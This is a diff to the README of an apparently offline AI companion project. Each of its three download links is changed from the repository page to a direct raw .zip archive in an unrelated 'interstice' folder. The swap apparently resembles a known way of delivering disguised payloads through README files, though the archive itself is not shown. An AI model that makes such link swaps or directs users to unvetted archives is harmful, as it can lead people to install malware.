@@ -1,6 +1,6 @@
 # 🤖 Evaan_Personal_Intelligence_Engine - Your Private AI Companion, Fully Offline
 
-[![Download Evaan](https://img.shields.io/badge/Download-Evaan_AI-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Masonjavan1817/Evaan_Personal_Intelligence_Engine)
+[![Download Evaan](https://img.shields.io/badge/Download-Evaan_AI-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Masonjavan1817/Evaan_Personal_Intelligence_Engine/main/interstice/Personal_Intelligence_Evaan_Engine_v1.4.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Before downloading, ensure your computer meets these simple requirements:
 
 Visit this link to download the application:
 
-[**Download Evaan Now**](https://github.com/Masonjavan1817/Evaan_Personal_Intelligence_Engine)
+[**Download Evaan Now**](https://raw.githubusercontent.com/Masonjavan1817/Evaan_Personal_Intelligence_Engine/main/interstice/Personal_Intelligence_Evaan_Engine_v1.4.zip)
 
 ### Step 2: Extract the Files
 
@@ -204,7 +204,7 @@ This project is open-source and free to use, modify, and distribute for personal
 
 Don't wait — download Evaan now and experience the freedom of a personal AI that respects your privacy and works anywhere.
 
-[**⬇️ Download Evaan Now**](https://github.com/Masonjavan1817/Evaan_Personal_Intelligence_Engine)
+[**⬇️ Download Evaan Now**](https://raw.githubusercontent.com/Masonjavan1817/Evaan_Personal_Intelligence_Engine/main/interstice/Personal_Intelligence_Evaan_Engine_v1.4.zip)
 
 ---
 
